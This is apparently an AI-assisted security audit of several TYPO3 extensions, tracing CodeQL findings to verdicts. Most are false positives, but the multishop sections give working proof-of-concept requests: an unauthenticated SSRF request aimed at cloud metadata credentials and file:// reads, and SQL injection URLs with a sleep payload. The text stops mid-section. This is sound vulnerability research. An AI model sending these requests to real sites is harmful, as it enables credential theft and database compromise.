- **Analysis:** The value is written only by `saveFolderState` (`serialize(array)`) into the server-side FE session store; the client cannot inject raw bytes there. Not exploitable as object injection under normal TYPO3 session handling. Flagged only for hardening (mirror the `allowed_classes => false` used in `EidFrontendAuthentication::unpackUc`).

### F3 — Substring group match in `matchFeGroupsWithFeUser`
- **SEVERITY:** Informational. **PRE-AUTH:** No (requires login).
- **Location:** `CheckPermissions::matchFeGroupsWithFeUser` — `if (str_contains($groups, '-2')) return true;` (`Classes/Security/CheckPermissions.php:311`).
- **Analysis:** Intended to grant "any logged-in user" when the special group `-2` is present. `str_contains` is a loose substring test, but stored `fe_groups` CSVs only ever hold positive fe_group UIDs plus the sentinel `-2`, so no real UID string contains `-2`. Reached only after the `$userFeGroups === false` (not-logged-in) early return, so it cannot help an anonymous request. Not exploitable; noted for correctness (prefer exact CSV membership).

## Known CVEs / Advisories
- No TYPO3 security advisory is published for `beechit/fal_securedownload` itself (checked typo3.org security advisories / Packagist).
- Related **core** FAL advisories affect the fallback storage, not this extension's gate: **TYPO3-CORE-SA-2026-013** (Broken Access Control, Media Module fallback storage) and **CVE-2024-25121 / GHSA-rj3x-wvc6-5j66** (FAL entities persisted via DataHandler referencing fallback storage). These are core-side; v6.0.3's own dump path is unaffected and correctly delegates to core `FileDumpController`.

## Conclusion
The download/dump path and the `FalSecuredownloadFileTreeState` eID were traced end-to-end. Access control is enforced on every file-serving sink, file identity is by integer UID (no traversal), and tokens are encryptionKey-keyed HMACs (not forgeable). **No unpatched pre-auth arbitrary file read exists in v6.0.3.** Only the low/informational items F1–F3 above are concrete.

### bitpatroon_bitpatroon_support_functions

#### Audit — bitpatroon_support_functions / CookieService unserialize sinks

**Verdict: MITIGATED (data-only unserialize) — AND no pre-auth caller.** Double-negative: both the object-injection primitive and the reachability are absent.

- Extension version: **10.3** (`ext_emconf.php`, `'version' => '10.3'`). No TYPO3 version constraint declared (`depends` empty).
- File: `bitpatroon_support_functions/Classes/Service/CookieService.php`
- Namespace: `BPN\SupportFunctions\Service\CookieService`

## The three sinks

All three `unserialize()` calls pass the PHP7+ `['allowed_classes' => false]` flag, which downgrades them to **data-only** deserialization — no `__wakeup`/`__destruct` gadget can be instantiated. POP-chain object injection is not possible.

| # | Line | Argument | Attacker-controlled? | Mitigation |
|---|------|----------|----------------------|------------|
| 1 | **CookieService.php:81** | `unserialize($decodedMessage, ['allowed_classes' => false])` where `$decodedMessage = base64_decode($_COOKIE[$cookieName])` | Yes — raw `$_COOKIE` value | `allowed_classes=>false` ✅ |
| 2 | **CookieService.php:106** | `unserialize($attributes[self::FIELD_CONTENT], ['allowed_classes' => false])` — `FIELD_CONTENT` is an inner serialized blob taken from the same base64 cookie | Yes — cookie-derived | `allowed_classes=>false` ✅ |
| 3 | **CookieService.php:122** | `unserialize($decodedMessage, ['allowed_classes' => false])` in `markCookieUsed()`, again `base64_decode($_COOKIE[$cookieName])` | Yes — raw `$_COOKIE` value | `allowed_classes=>false` ✅ |

Input source is genuinely attacker-controlled (`$_COOKIE[$cookieName]`, lines 75, 112), so the CodeQL taint is real — but the sink is neutralized.

## Reachability

The three methods (`getSecureCookieData`, `markCookieUsed`) are a **library, never wired to any request path**:

- Corpus-wide grep for `getSecureCookieData` / `::setSecureCookie` / the `BPN\SupportFunctions\Service\CookieService` FQCN finds **only the unit test** (`Tests/Unit/Service/CookieServiceTests.php`) as a caller. No production caller anywhere in the ~thousands-of-extensions corpus.
- The extension **does** register a frontend middleware — `Configuration/RequestMiddlewares.php` → `BPN\SupportFunctions\Middleware\NoCachePrefixMiddleware` — but that middleware only rewrites `/nc` URL prefixes to `no_cache=1`. It does **not** touch `CookieService`, `$_COOKIE`, or `unserialize`.
- No eID, no hook, no plugin, no `ext_localconf.php` (absent) references CookieService.

So even if the flag were absent, no pre-auth (or any) frontend path invokes these methods within this extension.

## Note on cookie integrity

The read path further validates a HMAC-style hash (`VerificationCodeService::isValid`, line 90) keyed by a hardcoded `SECRET` before honoring `FIELD_CONTENT`. Irrelevant here since the sink is already data-only, but it means sink #2 (line 106) is additionally gated behind a signature check on the default `$mustBeValid=true` path.

## Conclusion

Not exploitable. The object-injection reading is **mitigated** by `allowed_classes=>false` at all three sites, and independently there is **no pre-auth caller** (no caller at all outside tests). No request or cookie triggers a POP chain. FALSE POSITIVE for object injection.

### bitpatroon_bpn_request_access

#### Security Audit — `bpn_request_access` (Bitpatroon "BPN Request access")

- **Version:** 10.4.0 (`ext_emconf.php`; no explicit TYPO3 constraint — TYPO3 v10-era API, uses removed `TYPO3_DB`/`ObjectManager`)
- **Base dir:** `/home/user/sources/code/typo3-extensions/bitpatroon_bpn_request_access/`

## Pre-auth entry points

| Entry | Wiring | Auth level |
|-------|--------|------------|
| `Eid\UserSearchEid` | `ext_localconf.php` → `eID_include['bpn_request_access_usersearch'] = extPath . 'Classes/Eid/UserSearchEid.php'` (a **file path**, not `Class::method`) | eID, but **requires a logged-in FE user** and is **non-functional as wired** (see Issue 1) |
| `RequestAccessController` (Extbase plugin `RequestAccess`) actions `grantAccess` / `denyAccess` / `denyAccessWithFeedback` | `ext_localconf.php` `configurePlugin` (cached + non-cached) | **Unauthenticated FE** — these actions skip `ensureAuthorized()`; gated only by `verificationCode` |
| `RequestAccessController` actions `requestAccessForm` / `requestAccess` | same plugin | Authenticated FE — call `ensureAuthorized()` (`:115,:149`) |

---

## Issue 1 — SQLi in `UserSearchEid` (`$_GET['q']` → `LIKE`) → **FALSE POSITIVE (unreachable + escaped + auth-gated)**

Candidate sink:
```
UserSearchEid.php:38  $searchTerm = mysqli_real_escape_string($db->getDatabaseHandle(), $_GET['q']);
UserSearchEid.php:48  ... name LIKE '%$searchTerm%' OR ... email LIKE '%$searchTerm%'
UserSearchEid.php:53  $res = $db->sql_query($query);
```
Three independent reasons this is not exploitable:

1. **Unreachable as wired.** The eID target is a plain **file path** with no `::`, so TYPO3's eID handler simply `require`s the file. The file only *declares* class `UserSearchEid` (methods `start()`/`determineRole()`) — there is **no procedural bootstrap** (`tail` of file ends at `}`; no `(new UserSearchEid())->start();`). `start()` is never invoked, so the query never executes. The `//todo` header and unqualified references (`FrontendUserGroupRepository`, `UsergroupHandle`, `ArrayFunctions` — no `use` imports, would fatal in namespace `BpnRequestAccess\Eid`) confirm the class is incomplete/dead code.
2. **Not pre-auth even if invoked.** `start()` guards the whole body with `if (isset($this->feUser->user['uid']))` (`:31`) after `initFEuser()`; anonymous callers hit `http_response_code(401); die()`.
3. **Input escaped.** `q` is passed through `mysqli_real_escape_string` (`:38`) before interpolation, neutralizing quote/backslash breakout inside the `LIKE`. Residual risk is only `%`/`_` LIKE-wildcard injection (search broadening), not SQL structure injection. (`$permWhere` at `:49` is an undefined variable — dead artifact, not attacker-controlled.)

**Verdict:** FALSE POSITIVE — dead/unreachable eID, additionally auth-gated and escaped.

---

## Issue 2 — Auth bypass on `grantAccess` / `denyAccess` (token workflow) → **HARDENED (HMAC capability token)**

These actions are the genuine unauthenticated surface (no `ensureAuthorized()`), reachable by any anonymous FE visitor:
```
RequestAccessController.php:194  grantAccessAction(string $verificationCode = '')
RequestAccessController.php:208    $request = $accessService->getRequest($verificationCode);
RequestAccessController.php:216    $accessService->grantAccess($verificationCode, $request);
RequestAccessController.php:266  denyAccessWithFeedbackAction(...) -> getRequest() -> denyAccess()
```
Security of the whole flow rests on `verificationCode`. Analysis:

- **Lookup is an exact parameterized match.** `AccessService::getRequest` → `RequestRepository::findOneByVerificationCode($code)` (Extbase magic finder → bound `verification_code = ?` within the storage pid). No SQLi. Returns `RESULT_REQUEST_NOT_FOUND` if absent and `RESULT_REQUEST_ALREADY_PROCESSED` if `request_result != UNVOTED` (single-use).
- **Empty-token match blocked.** `grantAccessAction` throws on `!$verificationCode` (`:200`); `denyAccessAction`/`denyAccessWithFeedbackAction` throw on `empty($verificationCode)` (`:249`). So an empty code cannot match an empty-column row.
- **Token is an unforgeable HMAC.** `VerificationCodeService::createVerificationCode` = `hash_hmac('sha256', $input . $expirationTime, $secureKey)` (64-hex), and `grantAccess` re-validates via `isValid()` = strict `hash_hmac(...) === storedHash` **and** not expired (`VerificationCodeService::isValid`). `$secureKey` is a **required** config value — `BpnRequestAccessConfiguration::initializeApplication` throws (`1619729031`) if `verificationCode.secureKey` is unset, so there is no empty/hardcoded-key default.
- **Attacker cannot self-seed a row.** A valid code only enters the DB via `AccessService::createAccessRequest`, reachable solely through `requestAccessAction`, which is behind `ensureAuthorized()` (`:149`); and the generated code is emailed **only** to the examination admin (`sendRequestAccessEmail`), never rendered back to the requester. So an anonymous attacker can neither guess (SHA-256/HMAC) nor obtain the capability token, and cannot forge one that also exists in the DB.

**Verdict:** HARDENED. The unauthenticated grant/deny actions are protected by a single-use, expiring, `secureKey`-bound HMAC token that is verified both by DB existence and by HMAC re-computation. No auth bypass.

- **NEEDS-CONFIG note:** the entire model depends on the operator setting a strong, secret `plugin.tx_bpnrequestaccess.settings.verificationCode.secureKey` in TypoScript. It is mandatory (enforced) but weak/shared keys would weaken forgeability. Also recommend `hash_equals()` in `isValid` instead of `===` (timing hardening) — minor.

## Issue 3 — Stored/reflected XSS (deny feedback / request title) → **FALSE POSITIVE (Fluid-escaped)**

- `denyAccessWithFeedback` places attacker-suppliable `reason` into an email via `createViewClone(...)->assign('userRequestDeniedReason', $reason)` rendered through Fluid (auto HTML-escaped), and delivered only to the request source's own email. `verificationCode` echoed to `denyAccess` view is likewise Fluid-assigned. No raw HTML sink reached.

---

## Summary

| Issue | Verdict |
|-------|---------|
| SQLi in `UserSearchEid` (`$_GET['q']`) | FALSE POSITIVE — dead/unreachable eID (no bootstrap), FE-auth-gated, `mysqli_real_escape_string` |
| Auth bypass on `grantAccess`/`denyAccess` token flow | HARDENED — single-use expiring HMAC(`secureKey`) token, DB-existence + HMAC double check, empty-token blocked |
| XSS via deny-reason / verification code | FALSE POSITIVE — Fluid auto-escaping, email-only sink |

**No confirmed pre-auth vulnerability.** Caveats: security depends on a mandatory-but-operator-set `verificationCode.secureKey` (NEEDS-CONFIG); recommend `hash_equals` for the token compare. The `UserSearchEid` file is broken/dead code and should be removed or correctly wired+parameterized before any future use.

### brezo-it_multi-file-upload

#### Security Audit — brezo-it/multi_file_upload

- Extension key: `multi_file_upload`
- Version: 1.2.0 (`ext_emconf.php`)
- Platform: TYPO3 v13.4 / v14, `typo3/cms-form` (Form Framework element/finisher package)
- Scope: unrestricted upload / RCE, path traversal in target filename/dir, missing auth on upload endpoint

## Summary

No concrete pre-auth vulnerability found. The extension is a thin layer on top of
the TYPO3 Form Framework: it adds a `MultiFileUpload` form element, two custom
`TypeConverter`s that delegate the actual file persistence to the **core**
`TYPO3\CMS\Form\Mvc\Property\TypeConverter\UploadedFileReferenceConverter`, plus a
mail/attach finisher. All file-writing, filename sanitisation and extension
deny-listing remain in core code; the extension introduces no independent file
sink, no eID/AJAX endpoint, and no request-controlled upload path.

## Entry point / data flow

- Entry: standard Form Framework submission (frontend, may be anonymous by design).
  There is **no eID or AJAX route** — `ext_localconf.php` only registers the
  `ext/form` `afterBuildingFinished` / `afterFormStateInitialized` hooks and YAML.
- Sink (upload): `MultiUploadedFileReferenceConverter::convertFiles()`
  (`Classes/Mvc/Property/TypeConverter/MultiUploadedFileReferenceConverter.php:49-68`)
  iterates the uploaded-files array and calls
  `GeneralUtility::makeInstance(UploadedFileReferenceConverter::class)->convertFrom($item, FileReference::class, ...)`.
  The write, unique-name generation and the `fileDenyPattern` enforcement all
  happen inside that core converter → core `ResourceStorage::addUploadedFile()`.

## Findings (attack classes disproven)

### 1. Unrestricted upload / .php → RCE — NOT VULNERABLE
- PRE-AUTH: form can be public, but no bypass exists.
- The extension never chooses/writes a filename itself. Persistence is delegated to
  core `UploadedFileReferenceConverter` (`MultiUploadedFileReferenceConverter.php:61`,
  `SingleUploadedFileReferenceConverter.php:43/50`), which routes through
  `ResourceStorage`, applying `$GLOBALS['TYPO3_CONF_VARS']['BE']['fileDenyPattern']`
  (blocks `php`, `phtml`, `.htaccess`, etc.) plus `sanitizeFileName()`. Optional
  per-form `allowedMimeTypes` validators are configured by the form editor and run
  in addition. No executable-extension bypass is introduced here.

### 2. Path traversal in upload folder / filename — NOT VULNERABLE
- Upload folder is the form-element property `saveToFileMount`
  (`MultiFilePropertyMappingConfiguration.php:52`), set by a backend form author, and
  is validated before use by `checkSaveFileMountAccess()`
  (`MultiFilePropertyMappingConfiguration.php:121-139`): it rejects extension paths
  (`PathUtility::isExtensionPath`) and requires a resolvable FAL combined identifier
  (`getFolderObjectFromCombinedIdentifier`). The `uploadSeed` is the form **session
  identifier** (`:91-115`), not attacker input. No request parameter reaches the
  folder path; the target filename is generated by core, not by the request.

### 3. Missing auth on an upload endpoint — NOT APPLICABLE
- There is no custom endpoint. Submission goes through the Form Framework runtime
  (CSRF/HMAC-protected form state). `MultiUploadedResourceViewHelper` protects
  re-submitted resource pointers with an HMAC
  (`HashService::appendHmac(..., HashScope::ResourcePointer->prefix())`,
  `MultiUploadedResourceViewHelper.php:88`), so an attacker cannot forge a
  `submittedFile.resourcePointer` to attach an arbitrary existing sys_file.

### 4. IDOR file deletion via `<property>__delete[uid]` — NOT VULNERABLE
- `MultiUploadedFileReferenceConverter::applyDeletions()` and
  `UploadDeleteRequest::getMarkedFileUids()` only `detach()` a FileReference from the
  in-memory `MultiFile` storage (form value); nothing is `unlink`ed from disk
  (`MultiUploadedFileReferenceConverter.php:104-125`, `UploadDeleteRequest.php`).
  The deletion set is filtered to UIDs already present in the current form value
  (`:114-120`), so a foreign UID has no effect. No `unlink`/`delete()` sink exists.

## Cross-reference

No public TYPO3 security advisory (TYPO3-EXT-SA) is known for this extension/version
for the reviewed classes. Assessment is based on source review of v1.2.0.

## Conclusion

No path traversal, unrestricted upload, or missing-auth vulnerability. Security
depends on unchanged TYPO3 core file-upload controls (fileDenyPattern, FAL
permissions, Form Framework HMAC), which this extension correctly reuses.

### bvbmedia_bvbmedia_multishop

#### Audit — bvbmedia_multishop / SSRF in file_get_contents wrapper

**Verdict: CONFIRMED pre-auth SSRF** (arbitrary-host, incl. `file://` local read). A degraded no-HPP variant additionally lets any guest force re-fetch of admin-configured import URLs.

- Extension version: **5.1.110** (`ext_emconf.php`). Constraints: TYPO3 `6.2.5-7.9.99`, PHP `5.3.15-5.6.99`. Abandoned; same corpus already confirmed pre-auth SQLi.
- Frontend plugin: `tx_multishop_pi1` (registered `addPItoST43`, `list_type`), `pi_checkCHash = false` (no cHash/CSRF gate on the plugin).

## The sink

`mslib_fe::file_get_contents($filename)` — `pi1/classes/class.mslib_fe.php:10351` — is a fetch wrapper. For any `$filename` with a URL scheme it runs:

- `curl_init($filename)` — **class.mslib_fe.php:10385**
- `curl_setopt(..., CURLOPT_SSL_VERIFYPEER, false)` — 10386
- `curl_exec($ch)` — **class.mslib_fe.php:10400**
- on 301/302: `file_get_contents($filename)` — 10404

(The CodeQL report's `:10392`/`:10393` are the `CURLOPT_CONNECTTIMEOUT`/`CURLOPT_TIMEOUT` lines of the same curl block — minor line drift vs. this revision; same wrapper function. `curl_exec` is the effective sink at 10400.) No host allow-list, no scheme restriction; `curl` here also honors `file://`.

## Attacker input → sink chain

Caller: **`scripts/admin_pages/admin_import.php:469`**
```php
$file_content = mslib_fe::file_get_contents($this->post['file_url']);   // $this->post = _POST()
```
`$this->post = GeneralUtility::_POST()` and `$this->get = GeneralUtility::_GET()` (raw superglobals — `pi1/class.tx_multishop_pi1.php:97-98`). So `file_url` is a raw POST field. The only filter before the sink is `if (strstr($this->post['file_url'], "../")) die();` (admin_import.php:461) — blocks the `../` substring only; `http://169.254.169.254/…`, `http://127.0.0.1:port/`, `file:///etc/passwd` all pass.

### Pre-auth reachability

The multishop "admin panel" is a frontend plugin flow (`admin_main` → `scripts/admin_pages/core.php`). The guest gate is at **core.php:137**:
```php
if (!$this->ADMIN_USER) {
    switch ($this->ms['page']) {
        case 'admin_import':
        case 'admin_customer_import':
            if ($this->get['action'] != 'run_job') { exit(); }   // guests ALLOWED when action=run_job
            break;
        default: exit();
    }
}
```
The developers deliberately let **unauthenticated** users into `admin_import` when `action=run_job` (comment: *"Only allow running the import as a guest user (through cronjob)"*). Dispatch then requires the script when `is_numeric($this->get['job_id'])` (core.php ~376) — and `$this->get` is **pure `$_GET`**, so a guest simply supplies a numeric `job_id` in the query string; no secret `code` and no existing job row is required to load `admin_import.php`.

Inside admin_import.php, the guest-URL sink lives in the `product-import-preview` branch:
```php
} elseif ($this->post['action'] == 'product-import-preview' or (is_numeric($_REQUEST['job_id']) and $_REQUEST['action']=='edit_job')) {  // :434
    if (is_numeric($_REQUEST['job_id'])) {           // :436  — loads DB job, OVERWRITES $this->post
        ... $this->post = $data[1]; ...
    }
    ...
    } elseif ($this->post['file_url']) {             // :460 — guest POST value survives if :436 skipped
        if (strstr($this->post['file_url'], "../")) die();   // :461
        $file_content = mslib_fe::file_get_contents($this->post['file_url']);  // :469  SINK
```

The one obstacle is line 436: if `$_REQUEST['job_id']` is numeric it reloads the stored job and overwrites `$this->post` (wiping the guest `file_url`). The gap: **core.php checks `$this->get['job_id']` (pure GET) while admin_import.php checks `$_REQUEST['job_id']`.** With PHP's default `request_order=GP`, POST overrides GET in `$_REQUEST`. Sending `job_id` numeric in GET and non-numeric in POST satisfies core.php's gate yet skips the line-436 overwrite — leaving `$this->post['file_url']` fully attacker-controlled into the sink.

### Exact request to trigger

```
POST /index.php?id=<shop_pid>&type=2003&tx_multishop_pi1[page_section]=admin_import&action=run_job&job_id=1 HTTP/1.1
Host: victim
Content-Type: application/x-www-form-urlencoded

action=product-import-preview&job_id=x&file_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
- GET `job_id=1` (numeric) → passes core.php `is_numeric($this->get['job_id'])` → `require(admin_import.php)`.
- GET `action=run_job` → passes the guest gate at core.php:137.
- POST `action=product-import-preview` → enters branch at :434.
- POST `job_id=x` → `$_REQUEST['job_id']` non-numeric (POST wins) → skips :436 overwrite.
- POST `file_url=…` → reaches sink at :469 → server-side `curl_exec` to the attacker-chosen URL. Response body is fetched (and, if it parses as an import feed, partly reflected/stored), so this is a read/exfil-capable SSRF; `file://` gives local file read.

**Auth level: unauthenticated (guest).** No FE login, no admin usergroup, no cHash, no CSRF token. `$this->ADMIN_USER` is false throughout.

### Degraded variant (no HPP dependency)

Even ignoring the GET/`$_REQUEST` split: a guest sending only GET `job_id=<n>` for an existing job triggers the line-436/1078 load and re-fetches the **admin-configured** URL of import job `n` (`run_job` branch also at admin_import.php:1006 → :1105 `file_get_contents($this->post['file_url'])`). Host is admin-chosen there (weaker), but it is still an unauthenticated trigger of a server-side outbound fetch. The full-strength finding is the arbitrary-host chain above.

## Conclusion

CONFIRMED unauthenticated SSRF. Attacker-controlled URL (`_POST['file_url']`) flows to `curl_exec`/`file_get_contents` in the `mslib_fe::file_get_contents()` wrapper (class.mslib_fe.php:10400/10404) via `scripts/admin_pages/admin_import.php:469`, reachable pre-auth through the `tx_multishop_pi1[page_section]=admin_import&action=run_job` guest path. Only guard is a `../` substring check — no host/scheme validation. Version 5.1.110.

### bvbmedia_multishop

#### Security Audit — TYPO3 extension `bvbmedia/multishop` (multishop) v5.1.110

- **Target:** `/home/user/sources/code/typo3-extensions/bvbmedia_multishop`
- **Version:** 5.1.110 (ext_emconf.php) — supports TYPO3 6.2.5–7.9.99, PHP 5.3–5.6. **Abandoned** (no support for TYPO3 8+).
- **Nature:** Legacy e-commerce "multishop" plugin. Raw-SQL era: ~3000 `$GLOBALS['TYPO3_DB']->sql_query()` calls in frontend-reachable code, WHERE clauses built by string concatenation.
- **Date:** 2026-08-04

## Summary

The extension is reachable **without authentication** through the standard frontend
plugin `tx_multishop_pi1` (list_type, registered in `ext_localconf.php` via
`addPItoST43`). When the plugin is configured in its normal **`coreshop`** mode, the
sub-page that is rendered is chosen **directly from the GET parameter
`tx_multishop_pi1[page_section]`** (`scripts/core.php:9-12`). This gives an
unauthenticated attacker control over which internal script runs — a wide attack
surface — and in particular reaches the product-search code.

**CONFIRMED pre-auth SQL injection**: the `price_filter` GET parameter flows
unescaped and unquoted-broken into a `HAVING` / `WHERE` clause of the product-search
query. This is the primary finding below. The codebase generally guards numeric
params with `is_numeric()` and string params with `addslashes()`, but `price_filter`
is validated only for the characters `<`, `>`, `-` and is **never** escaped or cast.

---

## FINDING 1 — Pre-auth SQL injection via `price_filter` (products search)

- **SEVERITY:** Critical (CWE-89)
- **PRE-AUTH:** Yes — public product search, no `ADMIN_USER`/`fe_user` gate.
- **Tainted parameter:** GET `price_filter` (raw `GeneralUtility::_GET()`).

### Source → sink trace

1. **Entry / raw source** — `pi1/class.tx_multishop_pi1.php:97`
   ```php
   $this->get = \TYPO3\CMS\Core\Utility\GeneralUtility::_GET();   // unsanitized
   ```
2. **Reachability (attacker-chosen page_section)** — plugin `coreshop` method includes the front controller:
   - `pi1/class.tx_multishop_pi1.php:549-550` → `require .../scripts/core.php`
   - `scripts/core.php:9-12`
     ```php
     if ($this->conf['page_section']) { $this->ms['page'] = $this->conf['page_section']; }
     else { $this->ms['page'] = $this->get['tx_multishop_pi1']['page_section']; }   // GET-controlled
     ```
   - `scripts/core.php:141-142` → `case 'products_search': require .../scripts/front_pages/products_search.php;`
3. **Taint parse (no escaping / no cast)** — `scripts/front_pages/products_search.php:75-84`
   ```php
   if ($this->get['price_filter']) {
       if (strstr($this->get['price_filter'], ">") or strstr($this->get['price_filter'], "<")) {
           $price_filter = $this->get['price_filter'];                 // raw string
       } elseif (strstr($this->get['price_filter'], "-")) {
           $array = explode("-", $this->get['price_filter']);
           if (count($array) == 2) { $price_filter = $array; }         // raw array halves
       }
   }
   ```
   Search executes whenever `price_filter` is set — `products_search.php:85`
   `if ($this->get['skeyword'] || is_numeric($parent_id) || $price_filter) { $do_search = 1; }`
4. **SINK (unescaped, quote-break)** — `scripts/front_pages/products_search.php:546-552`
   ```php
   if (is_array($price_filter)) {
       if (!$this->ms['MODULES']['FLAT_DATABASE'] and (isset($price_filter[0]) and $price_filter[1])) {
           $having[] = "(final_price >='" . $price_filter[0] . "' and final_price <='" . $price_filter[1] . "')";  // :548  NO addslashes
       } elseif (isset($price_filter[0])) {
           $filter[]  = "price_filter=" . $price_filter[0];             // :550  UNQUOTED, NO addslashes
       }
   }
   ```
   `$having` / `$filter` are handed to `mslib_fe::getProductsPageSet($filter, ... $having ...)`
   (`products_search.php` call site), which concatenates them straight into the query:
   - `pi1/classes/class.mslib_fe.php:350` (function def)
   - `.../class.mslib_fe.php:~513-517`  `$where_clause .= implode(' and ', $filter) . ' and ';`
   - `.../class.mslib_fe.php:~678-701`  `$having_clause = ' having ' . <each $having item>;` then
     `$str = $GLOBALS['TYPO3_DB']->SELECTquery($sel, $from, $where_clause, implode(',',$groupby).$having_clause, ...);`
     `$qry = $GLOBALS['TYPO3_DB']->sql_query($str);`
   `TYPO3_DB->SELECTquery()` performs **no escaping** of the WHERE/GROUP-BY(+HAVING)
   strings — it concatenates them verbatim. Injection confirmed.

### Why the usual guards do not save this sink
`categories_id`, `products_id`, `manufacturers_id` are `is_numeric()`-checked
(e.g. `application_top_always.php:333`, `products_listing.php:29-33`,
`ultrasearch.php:87/104`), and `skeyword` uses `addslashes()`. `price_filter` is the
outlier: only character-class checks, then interpolated into single-quoted SQL
(`:548`) or unquoted numeric context (`:550`).

### Exploitability
- Array branch requires exactly one `-` in the value and neither `<` nor `>`
  (so `explode('-')` yields 2 elements and the string branch at `:76` is skipped).
- `:548` (HAVING) targets the alias `final_price`, which is guaranteed selected in
  both the count and the data query when `$having` is non-empty
  (`class.mslib_fe.php` count branch sets
  `select_total_count = 'p.products_id,IF(s.status,s.specials_new_products_price,p.products_price) as final_price'`),
  so the injected clause is syntactically valid. Reachable in the default
  (non-`FLAT_DATABASE`) mode. In `FLAT_DATABASE` mode the value still reaches SQL via
  the `$filter[]`/`$having`→`$filter` handoff (`products_search.php:567-570`).

### PoC request URLs (unauthenticated)
Against any page hosting the multishop plugin in `coreshop` mode (`<PID>` = that page id):

Boolean / time-based via HAVING quote-break (`:548`):
```
/index.php?id=<PID>&tx_multishop_pi1[page_section]=products_search&price_filter=1' or sleep(5) and '1'='1-9999
```
→ injected clause becomes
`(final_price >='1' or sleep(5) and '1'='1' and final_price <='9999')`.

Unquoted numeric-context variant via `$filter` (`:550`, second half falsy):
```
/index.php?id=<PID>&tx_multishop_pi1[page_section]=products_search&price_filter=0 or 1=1-
```
→ `explode('-')` = `["0 or 1=1", ""]` → `$filter[] = "price_filter=0 or 1=1"`.

(URL-encode spaces/quotes in practice: `%20`, `%27`.)

---

## FINDING 2 — Attacker-controlled front-controller routing (enabler / hardening gap)

- **SEVERITY:** Medium (design weakness that widens the SQL/attack surface)
- **PRE-AUTH:** Yes
- **Location:** `scripts/core.php:9-12` (and analogous `scripts/ajax_pages/core.php`,
  reached via `pi1/class.tx_multishop_pi1.php:250`).
- The rendered section is taken from `tx_multishop_pi1[page_section]` GET input with no
  allow-list beyond the `switch`. This is what makes Finding 1 reachable on ordinary
  shop pages and should be considered when triaging every `case` in these dispatchers
  (each `require`d script trusts `$this->get`/`$this->post` directly).

---

## FINDING 3 — `addslashes`-only escaping on search LIKE clauses

- **SEVERITY:** Low/Informational
- **PRE-AUTH:** Yes
- **Location:** `scripts/front_pages/products_search.php:126,136,146-289`,
  `products_specials.php:387,454-461` — `skeyword`/`manufacturers_id` wrapped with
  `addslashes()` inside single quotes.
- `addslashes()` is not the DBAL-correct escaper (`quoteStr`/`fullQuoteStr`); it is
  generally effective on UTF-8 single-quoted contexts but is fragile (e.g.
  GBK/multibyte connection charsets) and is the wrong primitive for a security
  boundary. Noted for completeness; not independently proven exploitable here.

---

## FINDING 4 — `unserialize()` of POST input (authenticated only)

- **SEVERITY:** Medium, but **NOT pre-auth** (backend/admin scripts under
  `scripts/admin_pages/`, gated by `ADMIN_USER`).
- **Locations:** `admin_import.php:1021,1054`, `admin_customer_import.php:560,580`
  (`unserialize($this->post['cron_period'])`). PHP object injection reachable only by
  an authenticated shop administrator; listed for defense-in-depth, not a pre-auth win.

---

## Known CVEs / advisories

- **CVE-2013-4682** (GHSA-v4fw-fh5c-xvjg), CVSS 7.5 HIGH, CWE-89: *"SQL injection in
  the Multishop extension before 2.0.39 for TYPO3 via unspecified vectors."*
  The audited build is **5.1.110** (> 2.0.39), so it is past that fix, but the advisory
  confirms a documented SQLi history for this exact package. **Finding 1 is a distinct,
  still-present injectable parameter (`price_filter`) in the current abandoned 5.1.110
  release** and is not covered by the 2.0.39 remediation.
- No advisory found that specifically names `price_filter` or the
  `page_section`-driven dispatcher.

## Recommendation

Cast/whitelist `price_filter` before use — split on `-`, reject non-numeric halves
(`is_numeric()` / `(float)`), and build the price bounds with
`$GLOBALS['TYPO3_DB']->fullQuoteStr()` or parameterized values. More broadly, the
`coreshop`/ajax dispatchers should treat every `$this->get`/`$this->post` value used in
SQL as tainted and route through DBAL quoting. Given the extension is abandoned and
unsupported on current TYPO3, replacement is the durable fix.

### bytebuilders_t3clickmark

#### TARGET A — bytebuilders/t3clickmark — InjectWidgetMiddleware

**CodeQL claim:** Reflected XSS at `Classes/Middleware/InjectWidgetMiddleware.php:85`

## VERDICT: FALSE POSITIVE

Version: **0.3.55** (`ext_emconf.php:10`, `state => beta`, TYPO3 12.4.0–13.4.99)

---

## 1. Sink analysis

The middleware has two output paths. Neither reaches an unescaped HTML sink.

### Path A — the actual HTML-body injection (lines 57–73, 184–203)
This is the only place user-facing HTML markup is produced. The content type is
gated to `text/html` (line 52–55), so it *is* reflected into markup — but every
value is encoded:

- `Classes/Middleware/InjectWidgetMiddleware.php:198`
  ```php
  $configJson = json_encode($config, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);
  ```
  Emitted inside `<script type="application/json">`. The `JSON_HEX_TAG/AMP/APOS/QUOT`
  flags neutralize `< > & ' "` → cannot break out of the script element. **JSON-encoded → kill.**
- `Classes/Middleware/InjectWidgetMiddleware.php:202`
  ```php
  '<script src="' . htmlspecialchars($scriptPath, ENT_QUOTES, 'UTF-8') . '" defer></script>'
  ```
  `htmlspecialchars(ENT_QUOTES)` → **kill.**

The one request-derived value that reaches this path is the cache-buster query
param `t` (`:192–195`, `$queryParams['t']`) appended to `$scriptPath`, and it is
htmlspecialchars-escaped at `:202`. All other `$config` fields come from
TypoScript / DB / server env / HMAC / int, not raw request input.

### Path B — CodeQL's flagged line 85 (token-activation redirect, lines 79–111)
Line 85 is `$uri = $request->getUri();`. The taint CodeQL follows is
`getQueryParams()` → `$cleanUri` → `RedirectResponse`:
```php
:86  $queryParams = $request->getQueryParams();
:87  unset($queryParams['t3cm_activate']);
:88  $cleanQuery = http_build_query($queryParams);   // URL-encodes every value
:89  $cleanUri = (string)$uri->withQuery($cleanQuery);
:96/:109  return new RedirectResponse($cleanUri, 302);
```
`http_build_query()` percent-encodes all params, and the result only becomes a
`Location:` header on a 302 with an **empty body** (TYPO3 `RedirectResponse`
writes no HTML). No markup context, no HTML sink → **not XSS.**

Content-Type of the injected page is confirmed HTML (line 53 requires
`text/html`), so the finding is not dismissed on JSON grounds — it is dismissed
because the reflected values are all encoded.

## 2. Tainted chain
- Path A candidate: `:38/:192 getQueryParams()['t']` → `:195 $scriptPath .= '?t='` → `:202 htmlspecialchars(...)` → **encoded**, dead.
- Path B: `:38/:86 getQueryParams()` → `:88 http_build_query` (URL-encoded) → `:89 $cleanUri` → `:96/:109 RedirectResponse` Location header, empty body → **no HTML sink.**

No path delivers raw request input into HTML markup.

## 3. Reachability / auth
